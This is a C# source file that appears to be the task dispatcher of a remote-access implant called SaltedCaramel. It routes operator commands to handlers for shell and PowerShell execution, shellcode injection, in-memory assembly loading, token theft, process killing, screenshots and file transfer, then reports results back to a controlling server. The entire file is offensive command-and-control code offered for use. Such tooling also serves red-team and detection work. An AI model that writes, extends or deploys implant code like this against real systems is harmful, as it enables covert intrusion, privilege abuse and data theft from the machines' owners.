using SaltedCaramel.Tasks;
using System;
using System.Diagnostics;

namespace SaltedCaramel
{
    /// <summary>
    /// A task to assign to an implant
    /// </summary>
    public class SCTaskObject
    {
        public string command { get; set; }
        public string @params { get; set; }
        public string id { get; set; }
#if (DEBUG)
        public string status { get; set; }
        public string message { get; set; }
#else 
        internal string status { get; set; }
        internal string message { get; set; }
#endif

        public SCTaskObject (string command, string @params, string id)
        {
            this.command = command;
            this.@params = @params;
            this.id = id;
        }

        /// <summary>
        /// Handle a new task.
        /// </summary>
        /// <param name="implant">The CaramelImplant we're handling a task for</param>
        public void DispatchTask(SCImplant implant)
        {
            if (this.command == "cd")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to change directory " + this.@params);
                ChangeDir.Execute(this);
            }
            else if (this.command == "download")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to send file " + this.@params);
                Download.Execute(this, implant);
            }
            else if (this.command == "execute_assembly")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to execute assembly " + this.@params);
                Tasks.Assembly.Execute(this, implant);
            }
            else if (this.command == "exit")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to exit");
                Exit.Execute(this, implant);
            }
            else if (this.command == "kill")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to kill PID " + this.@params);
                Kill.Execute(this);
            }
            else if (this.command == "upload")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
                Upload.Execute(this, implant);
            }
            else if (this.command == "ps")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to list processes");
                ProcessList.Execute(this);
            }
            else if (this.command == "ls")
            {
                string path = this.@params;
                Debug.WriteLine("[-] DispatchTask - Tasked to list directory " + path);
                DirectoryList.Execute(this, implant);
            }
            else if (this.command == "powershell")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to run powershell");
                Powershell.Execute(this);
            }
            else if (this.command == "rev2self")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to revert token");
                Token.Revert(this);
            }
            else if (this.command == "run")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to start process");
                Proc.Execute(this, implant);
            }
            else if (this.command == "screencapture")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to take screenshot.");
                ScreenCapture.Execute(this, implant);
            }
            else if (this.command == "shell")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to run shell command.");
                Proc.Execute(this, implant);
            }
            else if (this.command == "shinject")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to run shellcode.");
                Shellcode.Execute(this, implant);
            }
            else if (this.command == "sleep")
            {
                try
                {
                    int sleep = Convert.ToInt32(this.@params);
                    Debug.WriteLine("[-] DispatchTask - Tasked to change sleep to: " + sleep);
                    implant.sleep = sleep * 1000;
                    this.status = "complete";
                }
                catch
                {
                    Debug.WriteLine("[-] DispatchTask - ERROR sleep value provided was not int");
                    this.status = "error";
                    this.message = "Please provide an integer value";
                }
            }
            else if (this.command == "steal_token")
            {
                Debug.WriteLine("[-] DispatchTask - Tasked to steal token");
                Token.Execute(this);
            }

            this.SendResult(implant);
        }

        private void SendResult(SCImplant implant)
        {
            if (this.status == "complete" && 
                this.command != "download" && 
                this.command != "screencapture")
            {
                implant.PostResponse(new SCTaskResp(this.id, this.message));
                implant.SendComplete(this.id);
            }
            else if (this.status == "error") implant.SendError(this.id, this.message);
        }
    }
}